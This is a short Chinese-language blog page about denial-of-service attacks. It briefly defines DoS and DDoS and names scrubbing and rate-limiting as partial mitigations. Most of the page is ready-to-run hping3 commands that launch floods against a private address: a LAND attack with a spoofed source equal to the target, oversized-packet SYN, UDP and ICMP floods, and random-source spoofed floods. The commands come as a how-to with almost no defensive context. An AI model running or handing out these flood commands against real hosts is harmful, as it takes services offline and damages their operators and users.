---
layout: default
title: 使用hping3进行dos攻击
---



# dos攻击是啥？

> * dos 攻击 deny of service <mark>拒绝服务攻击</mark>，就是给你干崩溃
> 
> * <mark>ddos</mark> distributed dos攻击 <mark>分布式拒绝服务攻击</mark>，找很多人干你崩溃
> 
> * 无法根治
> 
> * ai设备进行<mark>数据清洗</mark>，搞掉部分攻击流量
> 
> * 服务器<mark>限流</mark>，不至于被打崩溃，但业务依然被干扰

# land攻击

```bash
# land攻击就是源和目标一致的syn泛洪攻击
# land攻击会产生大量的空连接，消耗系统资源
hping3 192.168.1.1 -p 445 --syn -a 192.168.1.1 --flood
```

# 泪滴攻击

```bash
# 泪滴攻击需要制造分片异常的数据包
# hping3只能构造超大数据包，这并不是真正的泪滴攻击
hping3 192.168.1.1 -p 445 --syn -d 555555 --flood
hping3 192.168.1.1 -p 888 --udp -d 555555 --flood
hping3 192.168.1.1 --icmp -d 555555 --flood
```

# ip spoof随机源泛洪攻击

```bash
hping3 192.168.1.1 -p 445 --syn --rand-source --flood
hping3 192.168.1.1 -p 888 --udp --rand-source --flood
hping3 192.168.1.1 --icmp --rand-source --flood
```


